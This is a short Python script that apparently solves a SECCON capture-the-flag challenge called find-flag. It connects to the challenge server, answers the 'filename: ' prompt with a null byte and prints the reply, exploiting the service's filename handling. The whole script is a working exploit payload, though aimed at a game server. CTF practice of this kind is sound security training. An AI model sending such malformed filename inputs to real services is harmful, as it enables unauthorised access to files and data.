import socket

def recvuntil(client, delim=b'\n'):
    buf = b''
    while delim not in buf:
        buf += client.recv(1)
    return buf

host = 'find-flag.seccon.games'
port = 10042
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

recvuntil(client, b'filename: ')
client.send(b'\x00\n')
recvuntil(client)
recvuntil(client)
res=recvuntil(client)
print(res)
